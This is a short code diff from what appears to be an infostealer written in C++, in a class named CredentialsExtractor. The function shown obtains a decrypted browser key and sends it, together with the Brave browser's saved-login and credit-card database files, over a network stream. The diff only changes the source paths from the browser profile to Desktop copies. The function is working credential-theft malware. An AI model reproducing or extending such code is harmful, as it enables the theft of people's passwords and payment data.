@@ -57,13 +57,13 @@ std::vector<BYTE>  CredentialsExtractor::getDecryptedKey() {
 void CredentialsExtractor::sendKeyAndDatabase() {
     std::vector<BYTE> decryptedKey = getDecryptedKey();
     std::cout << decryptedKey.size() << std::endl;
-    std::string pathOfAccountsDatabase = R"(C:\Users\Nitropc\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data)";
-    std::string pathOfCreditCardsDatabase = R"(C:\Users\Nitropc\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data)";
+    std::string pathOfAccountsDatabase = R"(C:\Users\Nitropc\Desktop\Login Data)";
+    std::string pathOfCreditCardsDatabase = R"(C:\Users\Nitropc\Desktop\Web Data)";
 
     RESULT result;
     stream.sendBytes(decryptedKey);
     stream.sendFile(Converter::string2wstring(pathOfAccountsDatabase).c_str(), result);
-    stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
+   stream.sendFile(Converter::string2wstring(pathOfCreditCardsDatabase).c_str(), result);
 }
 
 
